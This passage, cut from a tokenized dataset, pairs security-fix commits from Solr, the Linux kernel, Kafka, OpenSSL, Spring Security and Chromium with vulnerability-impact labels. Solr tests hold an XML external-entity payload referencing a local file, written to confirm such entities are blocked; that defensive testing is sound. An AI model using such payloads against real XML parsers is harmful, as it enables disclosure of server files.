"tree", "into", "StAX", "parser", ":", "package", "org", ".", "apache", ".", "solr", ".", "util", ";", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "import", "java", ".", "io", ".", "InputStream", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "EntityResolver", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "SAXParserFactory", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLResolver", ";", "import", "javax", ".", "xml", ".", "transform", ".", "Source", ";", "import", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "input", ".", "ClosedInputStream", ";", "/", "**", "*", "This", "class", "provides", "several", "singletons", "of", "entity", "resolvers", "used", "by", "*", "SAX", "and", "StAX", "in", "the", "Java", "API", ".", "This", "is", "needed", "to", "make", "secure", "*", "XML", "parsers", ",", "that", "don", "'", "t", "resolve", "external", "entities", "from", "untrusted", "sources", ".", "*", "<", "p", ">", "This", "class", "also", "provides", "static", "methods", "to", "configure", "SAX", "and", "StAX", "*", "parsers", "to", "be", "safe", ".", "*", "<", "p", ">", "Parsers", "will", "get", "an", "empty", ",", "closed", "stream", "for", "every", "external", "*", "entity", ",", "so", "they", "will", "not", "fail", "while", "parsing", "(", "unless", "the", "external", "entity", "*", "is", "needed", "for", "processing", "!", ").", "*", "/", "public", "final", "class", "EmptyEntityResolver", "{", "public", "static", "final", "EntityResolver", "SAX_INSTANCE", "=", "new", "EntityResolver", "(", ")", "{", "@", "Override", "public", "InputSource", "resolveEntity", "(", "String", "publicId", ",", "String", "systemId", ")", "{", "return", "new", "InputSource", "(", "ClosedInputStream", ".", "CLOSED_INPUT_STREAM", ")", ";", "}", "}", ";", "public", "static", "final", "XMLResolver", "STAX_INSTANCE", "=", "new", "XMLResolver", "(", ")", "{", "@", "Override", "public", "InputStream", "resolveEntity", "(", "String", "publicId", ",", "String", "systemId", ",", "String", "baseURI", ",", "String", "namespace", ")", "{", "return", "ClosedInputStream", ".", "CLOSED_INPUT_STREAM", ";", "}", "}", ";", "/", "/", "no", "instance", "!", "private", "EmptyEntityResolver", "(", ")", "{", "}", "private", "static", "void", "trySetSAXFeature", "(", "SAXParserFactory", "saxFactory", ",", "String", "feature", ",", "boolean", "enabled", ")", "{", "try", "{", "saxFactory", ".", "setFeature", "(", "feature", ",", "enabled", ")", ";", "}", "catch", "(", "Exception", "ex", ")", "{", "/", "/", "ignore", "}", "}", "/", "**", "Configures", "the", "given", "{", "@", "link", "SAXParserFactory", "}", "to", "do", "secure", "XML", "processing", "of", "untrusted", "sources", ".", "*", "It", "is", "required", "to", "also", "set", "{", "@", "link", "#", "SAX_INSTANCE", "}", "on", "the", "created", "{", "@", "link", "XMLReader", "}", ".", "*", "@", "see", "#", "SAX_INSTANCE", "*", "/", "public", "static", "void", "configureSAXParserFactory", "(", "SAXParserFactory", "saxFactory", ")", "{", "/", "/", "don", "'", "t", "enable", "validation", "of", "DTDs", ":", "saxFactory", ".", "setValidating", "(", "false", ")", ";", "/", "/", "enable", "secure", "processing", ":", "trySetSAXFeature", "(", "saxFactory", ",", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "}", "private", "static", "void", "trySetStAXProperty", "(", "XMLInputFactory", "inputFactory", ",", "String", "key", ",", "Object", "value", ")", "{", "try", "{", "inputFactory", ".", "setProperty", "(", "key", ",", "value", ")", ";", "}", "catch", "(", "Exception", "ex", ")", "{", "/", "/", "ignore", "}", "}", "/", "**", "Configures", "the", "given", "{", "@", "link", "XMLInputFactory", "}", "to", "not", "parse", "external", "entities", ".", "*", "No", "further", "configuration", "on", "is", "needed", ",", "all", "required", "entity", "resolvers", "are", "configured", ".", "*", "/", "public", "static", "void", "configureXMLInputFactory", "(", "XMLInputFactory", "inputFactory", ")", "{", "/", "/", "don", "'", "t", "enable", "validation", "of", "DTDs", ":", "trySetStAXProperty", "(", "inputFactory", ",", "XMLInputFactory", ".", "IS_VALIDATING", ",", "Boolean", ".", "FALSE", ")", ";", "/", "/", "enable", "this", "to", "*", "not", "*", "produce", "parsing", "failure", "on", "external", "entities", ":", "trySetStAXProperty", "(", "inputFactory", ",", "XMLInputFactory", ".", "IS_SUPPORTING_EXTERNAL_ENTITIES", ",", "Boolean", ".", "TRUE", ")", ";", "inputFactory", ".", "setXMLResolver", "(", "EmptyEntityResolver", ".", "STAX_INSTANCE", ")", ";", "}", "}", "@", "@", "-", "110", ",", "6", "+", "110", ",", "46", "@", "@", "public", "void", "testRequestParams", "(", ")", "throws", "Exception", "@", "Test", "public", "void", "testExternalEntities", "(", ")", "throws", "Exception", "{", "String", "file", "=", "getFile", "(", "\"", "mailing_lists", ".", "pdf", "\"", ").", "toURI", "(", ").", "toASCIIString", "(", ");", "String", "xml", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", ">\"", "/", "/", "check", "that", "external", "entities", "are", "not", "resolved", "!", "\"", "<!", "DOCTYPE", "foo", "[", "<!", "ENTITY", "bar", "SYSTEM", "\\", "\"\"", "+", "file", "+", "\"\\", "\">", "]>", "\"", "\"", "<", "add", ">", "\"", "\"", "&", "bar", ";", "\"", "\"", "<", "doc", ">", "\"", "\"", "<", "field", "name", "=", "\\\"", "id", "\\", "\">", "12345", "<", "/", "field", ">", "\"", "\"", "<", "field", "name", "=", "\\\"", "name", "\\", "\">", "kitten", "<", "/", "field", ">", "\"", "\"", "<", "/", "doc", ">", "\"", "\"", "</", "add", ">", "\";", "SolrQueryRequest", "req", "=", "req", "(", ");", "SolrQueryResponse", "rsp", "=", "new", "SolrQueryResponse", "(", ");", "BufferingRequestProcessor", "p", "=", "new", "BufferingRequestProcessor", "(", "null", ")", ";", "XMLLoader", "loader", "=", "new", "XMLLoader", "(", ").", "init", "(", "null", ")", ";", "loader", ".", "load", "(", "req", ",", "rsp", ",", "new", "ContentStreamBase", ".", "StringStream", "(", "xml", ")", ",", "p", ")", ";", "AddUpdateCommand", "add", "=", "p", ".", "addCommands", ".", "get", "(", "0", ")", ";", "assertEquals", "(", "\"", "12345", "\"", ",", "add", ".", "solrDoc", ".", "getField", "(", "\"", "id", "\"", ").", "getFirstValue", "(", "))", ";", "req", ".", "close", "(", ");", "}", "public", "void", "testNamedEntity", "(", ")", "throws", "Exception", "{", "assertU", "(", "\"<", "?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "?", ">\\", "n", "\"", "\"", "<!", "DOCTYPE", "add", "[", "\\", "n", "<", "!", "ENTITY", "wacky", "\\", "\"", "zzz", "\\", "\"", ">", "\\", "n", "]", ">\"", "\"", "<", "add", ">", "<", "doc", ">", "\"", "\"", "<", "field", "name", "=", "\\\"", "id", "\\", "\">", "1", "<", "/", "field", ">", "\"", "\"", "<", "field", "name", "=", "\\\"", "foo_s", "\\", "\">", "&", "wacky", ";", "</", "field", ">", "\"", "+", "\"", "</", "doc", ">", "</", "add", ">", "\")", ";", "assertU", "(", "\"<", "commit", "/", ">\"", ");", "assertQ", "(", "req", "(", "\"", "foo_s", ":", "zzz", "\"", "),", "\"", "//", "*[", "@", "numFound", "=", "'", "1", "'", "]\"", ")", ";", "}", "import", "org", ".", "apache", ".", "solr", ".", "handler", ".", "loader", ".", "XMLLoader", ";", "import", "org", ".", "apache", ".", "solr", ".", "request", ".", "SolrQueryRequest", ";", "import", "org", ".", "apache", ".", "solr", ".", "update", ".", "AddUpdateCommand", ";", "import", "org", ".", "apache", ".", "solr", ".", "update", ".", "processor", ".", "BufferingRequestProcessor", ";", "@", "Test", "public", "void", "testEntities", "(", ")", "throws", "Exception", "{", "/", "/", "use", "a", "binary", "file", ",", "so", "when", "it", "'", "s", "loaded", "fail", "with", "XML", "eror", ":", "String", "file", "=", "getFile", "(", "\"", "mailing_lists", ".", "pdf", "\"", ").", "toURI", "(", ").", "toASCIIString", "(", ");", "String", "xml", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", ">\"", "\"", "<!", "DOCTYPE", "foo", "[", "\"", "+", "/", "/", "check", "that", "external", "entities", "are", "not", "resolved", "!", "\"", "<!", "ENTITY", "bar", "SYSTEM", "\\", "\"\"", "+", "file", "+", "\"\\", "\">", "\"", "/", "/", "but", "named", "entities", "should", "be", "\"", "<!", "ENTITY", "wacky", "\\", "\"", "zzz", "\\", "\">", "\"", "\"", "]>", "\"", "\"", "<", "random", ">", "\"", "\"", "&", "bar", ";", "\"", "\"", "<", "document", ">", "\"", "\"", "<", "node", "name", "=", "\\\"", "id", "\\", "\"", "value", "=", "\\\"", "12345", "\\", "\"/", ">\"", "\"", "<", "node", "name", "=", "\\\"", "foo_s", "\\", "\"", "value", "=", "\\\"", "&", "wacky", ";", "\\\"", "/>", "\"", "\"", "<", "/", "document", ">", "\"", "\"", "</", "random", ">", "\";", "SolrQueryRequest", "req", "=", "req", "(", "CommonParams", ".", "TR", ",", "\"", "xsl", "-", "update", "-", "handler", "-", "test", ".", "xsl", "\"", ");", "SolrQueryResponse", "rsp", "=", "new", "SolrQueryResponse", "(", ");", "BufferingRequestProcessor", "p", "=", "new", "BufferingRequestProcessor", "(", "null", ")", ";", "XMLLoader", "loader", "=", "new", "XMLLoader", "(", ").", "init", "(", "null", ")", ";", "loader", ".", "load", "(", "req", ",", "rsp", ",", "new", "ContentStreamBase", ".", "StringStream", "(", "xml", ")", ",", "p", ")", ";", "AddUpdateCommand", "add", "=", "p", ".", "addCommands", ".", "get", "(", "0", ")", ";", "assertEquals", "(", "\"", "12345", "\"", ",", "add", ".", "solrDoc", ".", "getField", "(", "\"", "id", "\"", ").", "getFirstValue", "(", "))", ";", "assertEquals", "(", "\"", "zzz", "\"", ",", "add", ".", "solrDoc", ".", "getField", "(", "\"", "foo_s", "\"", ").", "getFirstValue", "(", "))", ";", "req", ".", "close", "(", ");", "}</s>static", "{", "factory", ".", "setProperty", "(", "XMLInputFactory", ".", "IS_VALIDATING", ",", "Boolean", ".", "FALSE", ")", ";", "factory", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "Boolean", ".", "FALSE", ")", ";", "assertEquals", "(", "2", ",", "(", "(", "List", ")", "result", ".", "get", "(", "0", ")", ".", "get", "(", "\"", "a", "\"", "))", ".", "size", "(", "))", ";", "private", "static", "final", "String", "testXml", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "encoding", "=", "\\\"", "UTF", "-", "8", "\\", "\"?", "><", "root", ">", "<", "a", ">", "1", "<", "/", "a", ">", "<", "a", ">", "2", "<", "/", "a", ">", "</", "root", ">", "\";", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "inputFactory", ".", "setXMLReporter", "(", "xmllog", ")", ";", "Transformer", "t", "=", "getTransformer", "(", "tr", ",", "req", ")", ";", "final", "SAXSource", "source", "=", "new", "SAXSource", "(", "isrc", ")", ";", "/", "/", "second", "step", "feed", "the", "intermediate", "DOM", "tree", "into", "StAX", "parser", ":"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["vhost:", "actually", "track", "log", "eventfd", "file", "While", "reviewing", "vhost", "log", "code,", "I", "found", "out", "that", "log_file", "is", "never", "set.", "Note:", "I", "haven't", "tested", "the", "change", "(QEMU", "doesn't", "use", "LOG_FD", "yet).", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Marc-Andr\u00e9", "Lureau", "<marcandre.lureau@redhat.com>", "Signed-off-by:", "Michael", "S.", "Tsirkin", "<mst@redhat.com>"], "code_tokens": ["d", "-", ">", "log_file", "=", "eventfp", ";</s>"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(memory", "consumption", ")"]}
{"contents": ["ipv6:", "don't", "use", "tw", "net", "when", "accounting", "for", "recycled", "tw", "We", "already", "have", "a", "valid", "net", "in", "that", "place,", "but", "this", "is", "not", "just", "a", "cleanup", "-", "the", "tw", "pointer", "can", "be", "NULL", "there", "sometimes,", "thus", "causing", "an", "oops", "in", "NET_NS=y", "case.", "The", "same", "place", "in", "ipv4", "code", "already", "works", "correctly", "using", "existing", "net,", "rather", "than", "tw's", "one.", "The", "bug", "exists", "since", "2.6.27.", "Signed-off-by:", "Pavel", "Emelyanov", "<xemul@openvz.org>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["NET_INC_STATS_BH", "(", "net", ",", "LINUX_MIB_TIMEWAITRECYCLED", ")", ";", "NET_INC_STATS_BH", "(", "net", ",", "LINUX_MIB_TIMEWAITRECYCLED", ")", ";</s>NET_INC_STATS_BH", "(", "twsk_net", "(", "tw", ")", ",", "LINUX_MIB_TIMEWAITRECYCLED", ")", ";", "NET_INC_STATS_BH", "(", "twsk_net", "(", "tw", ")", ",", "LINUX_MIB_TIMEWAITRECYCLED", ")", ";"], "docstring_tokens": ["the", "affected", "kernel", "to", "crash"]}
{"contents": ["KAFKA-8774:", "Regex", "can", "be", "found", "anywhere", "in", "config", "value", "(#7197)", "Corrected", "the", "AbstractHerder", "to", "correctly", "identify", "task", "configs", "that", "contain", "variables", "for", "externalized", "secrets.", "The", "original", "method", "incorrectly", "used", "`matcher.matches()`", "instead", "of", "`matcher.find()`.", "The", "former", "method", "expects", "the", "entire", "string", "to", "match", "the", "regex,", "whereas", "the", "second", "one", "can", "find", "a", "pattern", "anywhere", "within", "the", "input", "string", "(which", "fits", "this", "use", "case", "more", "correctly).", "Added", "unit", "tests", "to", "cover", "various", "cases", "of", "a", "config", "with", "externalized", "secrets,", "and", "updated", "system", "tests", "to", "cover", "case", "where", "config", "value", "contains", "additional", "characters", "besides", "secret", "that", "requires", "regex", "pattern", "to", "be", "found", "anywhere", "in", "the", "string", "(as", "opposed", "to", "complete", "match).", "Author:", "Arjun", "Satish", "<arjun@confluent.io>", "Reviewer:", "Randall", "Hauch", "<rhauch@gmail.com>"], "code_tokens": ["/", "/", "Visible", "for", "testing", "static", "Set", "<", "String", ">", "keysWithVariableValues", "(", "Map", "<", "String", ",", "String", ">", "rawConfig", ",", "Pattern", "pattern", ")", "{", "if", "(", "matcher", ".", "find", "(", "))", "{", "import", "org", ".", "apache", ".", "kafka", ".", "common", ".", "config", ".", "ConfigTransformer", ";", "import", "static", "org", ".", "apache", ".", "kafka", ".", "connect", ".", "runtime", ".", "AbstractHerder", ".", "keysWithVariableValues", ";", "@", "Test", "public", "void", "testConfigProviderRegex", "(", ")", "{", "testConfigProviderRegex", "(", "\"\\", "\"$", "{:", ":}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"$", "{:", ":}", "\")", ";", "testConfigProviderRegex", "(", "\"\\", "\"$", "{:", "/", "a", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"\\", "\"$", "{", "file", ":", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"$", "{", "file", ":", "/", "a", "/", "b", "/", "c", ":", "}\"", ");", "testConfigProviderRegex", "(", "\"$", "{", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\")", ";", "testConfigProviderRegex", "(", "\"\\", "\"$", "{", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "\\\"", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\\\"", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "not", "null", "\"", ");", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "somevar", "}", "password", "=", "${", "file", ":", "/", "tmp", "/", "somefile", ".", "txt", ":", "othervar", "}", "\")", ";", "testConfigProviderRegex", "(", "\"", "plain", ".", "PlainLoginModule", "required", "username", "\"", ",", "false", ")", ";", "}", "private", "void", "testConfigProviderRegex", "(", "String", "rawConnConfig", ")", "{", "testConfigProviderRegex", "(", "rawConnConfig", ",", "true", ")", ";", "}", "private", "void", "testConfigProviderRegex", "(", "String", "rawConnConfig", ",", "boolean", "expected", ")", "{", "Set", "<", "String", ">", "keys", "=", "keysWithVariableValues", "(", "Collections", ".", "singletonMap", "(", "\"", "key", "\"", ",", "rawConnConfig", ")", ",", "ConfigTransformer", ".", "DEFAULT_PATTERN", ")", ";", "boolean", "actual", "=", "keys", "!", "=", "null", "&", "&", "!", "keys", ".", "isEmpty", "(", ")", "&", "&", "keys", ".", "contains", "(", "\"", "key", "\"", ");", "assertEquals", "(", "String", ".", "format", "(", "\"%", "s", "should", "have", "matched", "regex", "\"", ",", "rawConnConfig", ")", ",", "expected", ",", "actual", ")", ";", "}", "TOPIC", "=", "\"", "topic", "-", "${", "file", ":", "%", "s", ":", "topic", ".", "external", "}", "\"", "%", "ConnectServiceBase", ".", "EXTERNAL_CONFIGS_FILE</s>private", "static", "Set", "<", "String", ">", "keysWithVariableValues", "(", "Map", "<", "String", ",", "String", ">", "rawConfig", ",", "Pattern", "pattern", ")", "{", "if", "(", "matcher", ".", "matches", "(", "))", "{", "TOPIC", "=", "\"", "${", "file", ":", "%", "s", ":", "topic", ".", "external", "}", "\"", "%", "ConnectServiceBase", ".", "EXTERNAL_CONFIGS_FILE"], "docstring_tokens": ["obtain", "sensitive", "information", "in", "tasks", "endpoint"]}
{"contents": ["Document", "issue", "with", "default", "installation", "paths", "on", "diverse", "Windows", "targets", "For", "all", "config", "targets", "(except", "VMS,", "because", "it", "has", "a", "completely", "different", "set", "of", "scripts),", "'/usr/local/ssl'", "is", "the", "default", "prefix", "for", "installation", "of", "programs", "and", "libraries,", "as", "well", "as", "the", "path", "for", "OpenSSL", "run-time", "configuration.", "For", "programs", "built", "to", "run", "in", "a", "Windows", "environment,", "this", "default", "is", "unsafe,", "and", "the", "user", "should", "set", "a", "different", "prefix.", "This", "has", "been", "hinted", "at", "in", "some", "documentation", "but", "not", "all,", "and", "the", "danger", "of", "leaving", "the", "default", "as", "is", "hasn't", "been", "documented", "at", "all.", "This", "change", "documents", "the", "issue", "as", "a", "caveat", "lector,", "and", "all", "configuration", "examples", "now", "include", "an", "example", "--prefix.", "Reviewed-by:", "Matt", "Caswell", "<matt@openssl.org>", "(Merged", "from", "https://github.com/openssl/openssl/pull/9456)"], "code_tokens": ["*", ")", "Document", "issue", "with", "installation", "paths", "in", "diverse", "Windows", "builds", "'", "/", "usr", "/", "local", "/", "ssl", "'", "is", "an", "unsafe", "prefix", "for", "location", "to", "install", "OpenSSL", "binaries", "and", "run", "-", "time", "config", "file", ".", "(", "CVE", "-", "2019", "-", "1552", ")", "[", "Richard", "Levitte", "]", "CAVEAT", "LECTOR", "-", "--", "--", "--", "--", "--", "--", "#", "##", "Default", "install", "and", "config", "paths", ".", "/", "Configure", "defaults", "to", "'", "/", "usr", "/", "local", "/", "ssl", "'", "as", "installation", "top", ".", "This", "is", "suitable", "for", "Unix", ",", "but", "not", "for", "Windows", ",", "where", "this", "usually", "is", "a", "world", "writable", "directory", "and", "therefore", "accessible", "for", "change", "by", "untrusted", "users", ".", "It", "is", "therefore", "recommended", "to", "set", "your", "own", "-", "-", "prefix", "or", "-", "-", "openssldir", "to", "some", "location", "that", "is", "not", "world", "writeable", "(", "see", "the", "example", "above", ")", "#", "##", "Entropy", "CAVEAT", "LECTOR", "-", "--", "--", "--", "--", "--", "--", "#", "##", "Default", "install", "and", "config", "paths", ".", "/", "Configure", "defaults", "to", "'", "/", "usr", "/", "local", "/", "ssl", "'", "as", "installation", "top", ".", "This", "is", "suitable", "for", "Unix", ",", "but", "not", "for", "Windows", ",", "where", "this", "usually", "is", "a", "world", "writable", "directory", "and", "therefore", "accessible", "for", "change", "by", "untrusted", "users", ".", "It", "is", "therefore", "recommended", "to", "set", "your", "own", "-", "-", "prefix", "or", "-", "-", "openssldir", "to", "some", "location", "that", "is", "not", "world", "writeable", "(", "see", "the", "example", "above", ")", ">", "perl", "Configure", "BC", "-", "32", "-", "-", "prefix", "=", "c", ":", "\\", "some", "\\", "openssl", "\\", "dir", "$", ".", "/", "config", "-", "-", "prefix", "=", "c", ":", "/", "some", "/", "openssl", "/", "dir", "like", "this", ":", "$", ".", "/", "Configure", "-", "-", "cross", "-", "compile", "-", "prefix", "=", "i386", "-", "mingw32", "-", "\\", "-", "-", "prefix", "=", "c", ":", "/", "some", "/", "openssl", "/", "dir", "mingw", ".", "..", "(", "\"", "c", ":", "\\", "openssl", "\"", "should", "be", "whatever", "you", "specified", "to", "-", "-", "prefix", "when", "configuring", "the", "build", ")", "#", "##", "Default", "install", "and", "config", "paths", ".", "/", "Configure", "defaults", "to", "'", "/", "usr", "/", "local", "/", "ssl", "'", "as", "installation", "top", ".", "This", "is", "suitable", "for", "Unix", ",", "but", "not", "for", "Windows", ",", "where", "this", "usually", "is", "a", "world", "writable", "directory", "and", "therefore", "accessible", "for", "change", "by", "untrusted", "users", ".", "It", "is", "therefore", "recommended", "to", "set", "your", "own", "-", "-", "prefix", "or", "-", "-", "openssldir", "to", "some", "location", "that", "is", "not", "world", "writeable", "(", "see", "the", "example", "above", ")", ">", "perl", "Configure", "VC", "-", "WIN64A", "-", "-", "prefix", "=", "c", ":", "\\", "some", "\\", "openssl", "\\", "dir", ">", "perl", "Configure", "VC", "-", "WIN64I", "-", "-", "prefix", "=", "c", ":", "\\", "some", "\\", "openssl", "\\", "dir", "CAVEAT", "LECTOR", "-", "--", "--", "--", "--", "--", "--", "#", "##", "Default", "install", "and", "config", "paths", ".", "/", "Configure", "defaults", "to", "'", "/", "usr", "/", "local", "/", "ssl", "'", "as", "installation", "top", ".", "This", "is", "suitable", "for", "Unix", ",", "but", "not", "for", "Windows", ",", "where", "this", "usually", "is", "a", "world", "writable", "directory", "and", "therefore", "accessible", "for", "change", "by", "untrusted", "users", ".", "It", "is", "therefore", "recommended", "to", "set", "your", "own", "-", "-", "prefix", "or", "-", "-", "openssldir", "to", "some", "location", "that", "is", "not", "world", "writeable", "(", "see", "the", "example", "above", ")", ">", "perl", "Configure", "VC", "-", "CE", "-", "-", "prefix", "=", "c", ":", "\\", "some", "\\", "openssl", "\\", "dir</s>*", ")", "RUN", "-", "TIME", "CAVEAT", "LECTOR", ">", "perl", "Configure", "BC", "-", "32", "$", ".", "/", "config", "with", "'", "./", "Configure", "-", "-", "cross", "-", "compile", "-", "prefix", "=", "i386", "-", "mingw32", "-", "mingw", ".", "..", "'.", ">", "perl", "Configure", "VC", "-", "WIN64A", ">", "perl", "Configure", "VC", "-", "WIN64I", ">", "perl", "Configure", "VC", "-", "CE"], "docstring_tokens": ["modify", "(or", "even", "replace", ")", "existing", "engine", "modules"]}
{"contents": ["BCryptPasswordEncoder", "rawPassword", "cannot", "be", "null", "Closes", "gh-8317"], "code_tokens": ["if", "(", "rawPassword", "=", "=", "null", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "rawPassword", "cannot", "be", "null", "\"", ");", "}", "if", "(", "rawPassword", "=", "=", "null", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "rawPassword", "cannot", "be", "null", "\"", ");", "}", "@", "Test", "(", "expected", "=", "IllegalArgumentException", ".", "class", ")", "public", "void", "encodeNullRawPassword", "(", ")", "{", "BCryptPasswordEncoder", "encoder", "=", "new", "BCryptPasswordEncoder", "(", ");", "encoder", ".", "encode", "(", "null", ")", ";", "}", "@", "Test", "(", "expected", "=", "IllegalArgumentException", ".", "class", ")", "public", "void", "matchNullRawPassword", "(", ")", "{", "BCryptPasswordEncoder", "encoder", "=", "new", "BCryptPasswordEncoder", "(", ");", "encoder", ".", "matches", "(", "null", ",", "\"", "does", "-", "not", "-", "matter", "\"", ");", "}</s>"], "docstring_tokens": ["and", "use", "this", "information", "to", "launch", "further", "attacks", "against", "the", "affected", "system"]}
{"contents": ["[Bluetooth]", "Fix", "L2CAP", "and", "HCI", "setsockopt()", "information", "leaks", "The", "L2CAP", "and", "HCI", "setsockopt()", "implementations", "have", "a", "small", "information", "leak", "that", "makes", "it", "possible", "to", "leak", "kernel", "stack", "memory", "to", "userspace.", "If", "the", "optlen", "parameter", "is", "0,", "no", "data", "will", "be", "copied", "by", "copy_from_user(),", "but", "the", "uninitialized", "stack", "buffer", "will", "be", "read", "and", "stored", "later.", "A", "call", "to", "getsockopt()", "can", "now", "retrieve", "the", "leaked", "information.", "To", "fix", "this", "problem", "the", "stack", "buffer", "given", "to", "copy_from_user()", "must", "be", "initialized", "with", "the", "current", "settings.", "Signed-off-by:", "Marcel", "Holtmann", "<marcel@holtmann.org>"], "code_tokens": ["{", "struct", "hci_filter", "*", "f", "=", "&", "hci_pi", "(", "sk", ")", "->", "filter", ";", "uf", ".", "type_mask", "=", "f", "-", ">", "type_mask", ";", "uf", ".", "opcode", "=", "f", "-", ">", "opcode", ";", "uf", ".", "event_mask", "[", "0", "]", "=", "*", "((", "u32", "*", ")", "f", "-", ">", "event_mask", "+", "0", ")", ";", "uf", ".", "event_mask", "[", "1", "]", "=", "*", "((", "u32", "*", ")", "f", "-", ">", "event_mask", "+", "1", ")", ";", "}", "opts", ".", "imtu", "=", "l2cap_pi", "(", "sk", ")", "->", "imtu", ";", "opts", ".", "omtu", "=", "l2cap_pi", "(", "sk", ")", "->", "omtu", ";", "opts", ".", "flush_to", "=", "l2cap_pi", "(", "sk", ")", "->", "flush_to", ";", "opts", ".", "mode", "=", "0x00", ";</s>"], "docstring_tokens": ["read", "kernel", "memory", "and", "obtain", "sensitive", "information"]}
{"contents": ["chore:", "cherry-pick", "c244270e23", "from", "chromium.", "(#26484)"], "code_tokens": ["ignore_renderframehostimpl_detach_for_speculative_rfhs", ".", "patch", "@", "@", "-", "0", ",", "0", "+", "1", ",", "165", "@", "@", "From", "0000000000000000000000000000000000000000", "Mon", "Sep", "17", "00", ":", "00", ":", "00", "2001", "From", ":", "Daniel", "Cheng", "<", "dcheng", "@", "chromium", ".", "org", ">", "Date", ":", "Wed", ",", "11", "Nov", "2020", "00", ":", "54", ":", "41", "+", "0000", "Subject", ":", "Ignore", "RenderFrameHostImpl", ":", ":", "Detach", "(", ")", "for", "speculative", "RFHs", ".", "Currently", ",", "this", "all", "happens", "to", "work", "by", "chance", ",", "because", "the", "speculative", "RFH", "or", "the", "entire", "FTN", "happens", "to", "be", "torn", "down", "before", "the", "browser", "process", "ever", "processes", "a", "Detach", "(", ")", "IPC", "for", "a", "speculative", "RFH", ".", "However", ",", "there", "are", "a", "number", "of", "followup", "CLs", "that", "restructure", "how", "provisional", "RenderFrames", "are", "managed", "and", "owned", "in", "the", "renderer", "process", ".", "To", "simplify", "those", "CLs", ",", "explicitly", "branch", "in", "Detach", "(", ")", "based", "on", "whether", "or", "not", "the", "RFH", "is", "speculative", ".", "In", "the", "future", ",", "additional", "logic", "may", "be", "added", "to", "the", "speculative", "branch", "(", "e", ".", "g", ".", "cancelling", "the", "navigation", ",", "if", "appropriate", ")", ".", "(", "cherry", "picked", "from", "commit", "cf054220a2e1570a9149220494de8826c2e9d4db", ")", "Bug", ":", "1146709", "Change", "-", "Id", ":", "I6490a90f7b447422d698676665b52f6f3a6f8ffd", "Reviewed", "-", "on", ":", "https", ":", "//", "chromium", "-", "review", ".", "googlesource", ".", "com", "/", "c", "/", "chromium", "/", "src", "/", "+/", "2524280", "Commit", "-", "Queue", ":", "Daniel", "Cheng", "<", "dcheng", "@", "chromium", ".", "org", ">", "Reviewed", "-", "by", ":", "Nasko", "Oskov", "<", "nasko", "@", "chromium", ".", "org", ">", "Cr", "-", "Original", "-", "Commit", "-", "Position", ":", "refs", "/", "heads", "/", "master", "@", "{#", "825903", "}", "Reviewed", "-", "on", ":", "https", ":", "//", "chromium", "-", "review", ".", "googlesource", ".", "com", "/", "c", "/", "chromium", "/", "src", "/", "+/", "2530189", "Reviewed", "-", "by", ":", "Adrian", "Taylor", "<", "adetaylor", "@", "chromium", ".", "org", ">", "Cr", "-", "Commit", "-", "Position", ":", "refs", "/", "branch", "-", "heads", "/", "4240", "@", "{#", "1430", "}", 